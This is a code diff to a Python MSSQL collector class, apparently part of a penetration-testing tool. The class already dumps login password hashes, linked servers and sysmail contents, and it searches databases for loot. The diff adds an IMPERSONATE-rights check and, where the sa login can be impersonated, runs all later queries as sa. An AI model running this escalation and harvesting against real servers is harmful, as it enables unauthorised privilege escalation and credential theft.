@@ -23,6 +23,8 @@ class MSSQLCollector(BaseCollector):
 
         self.dir_name = f'{self.target.replace('.', '-')}_{self.type}_{secrets.token_hex(2)}'
 
+        self.impersonate = False
+
         self.version_query = 'SELECT @@VERSION'
         self.hash_query = 'SELECT name, password_hash FROM sys.sql_logins'
         self.user_query = 'SELECT name, is_disabled FROM sys.server_principals'
@@ -31,6 +33,14 @@ class MSSQLCollector(BaseCollector):
         self.sys_query = 'SELECT IS_SRVROLEMEMBER(\'sysadmin\');'
         self.conn_query = 'EXEC sp_who2'
         self.link_query = 'SELECT name AS LinkedServerName, product AS Product, provider AS Provider, data_source AS RemoteAddress, is_remote_login_enabled AS RemoteLogin, modify_date FROM sys.servers WHERE is_linked = 1'
+        # https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-stored-procedures-part-2-user-impersonation/
+        self.impersonation_query = '''
+        SELECT distinct b.name
+        FROM sys.server_permissions a
+        INNER JOIN sys.server_principals b
+        ON a.grantor_principal_id = b.principal_id
+        WHERE a.permission_name = \'IMPERSONATE\'
+        '''
 
         self.dbs = {}
         self.findings = {"columns": [], "tables": []}
@@ -43,6 +53,8 @@ class MSSQLCollector(BaseCollector):
         conn_str = f"SERVER={self.connection};{database}UID={self.user};PWD={self.password};Encrypt=yes;TrustServerCertificate=yes;"
         conn = mssql_python.connect(conn_str)
         self.cursor = conn.cursor()
+        if self.impersonate:
+            self.cursor.execute('EXECUTE AS LOGIN = \'sa\'')
     
     def getAllTables(self):
         with open(f'{self.dir_name}/tables.csv', 'w') as f:
@@ -61,6 +73,24 @@ class MSSQLCollector(BaseCollector):
     def getAllDBPrivs(self):
         for db in self.dbs:
             self.checkDBPrivs(db)
+    
+    def getImpersonation(self):
+        try:
+            self.cursor.execute(self.impersonation_query)
+        except Exception as e:
+            print(f'{RED}SQL Error: {e}{RESET}')
+        rows = self.cursor.fetchall()
+
+        for row in rows:
+            if row[0] == 'sa':
+                print(f'{YELLOW}[!] {row[0]}{RESET}')
+                print(f'[*] All remaining queries are executed as the \'sa\' user...')
+                self.cursor.execute('EXECUTE AS LOGIN = \'sa\'')
+                self.impersonate = True
+            elif (row[0] == '') or (row[0] == ''):
+                print(f'{GREEN}User has no impersonation rights :({RESET}')
+            else:
+                print(f'{row[0]}')
     
     def checkSysmail(self):
         sysmail_query = 'SELECT TOP 10 recipients, subject, body FROM msdb.dbo.sysmail_allitems'
@@ -84,7 +114,8 @@ class MSSQLCollector(BaseCollector):
 
     def getAllLoot(self):
         for db in self.dbs:
-            self.createConnection(db)
+            #self.createConnection(db)
+            self.cursor.execute(f'USE {db}')
             self.findLoot(db, self.keywords)
         if self.columns:
             self.findings['columns'] = self.matches
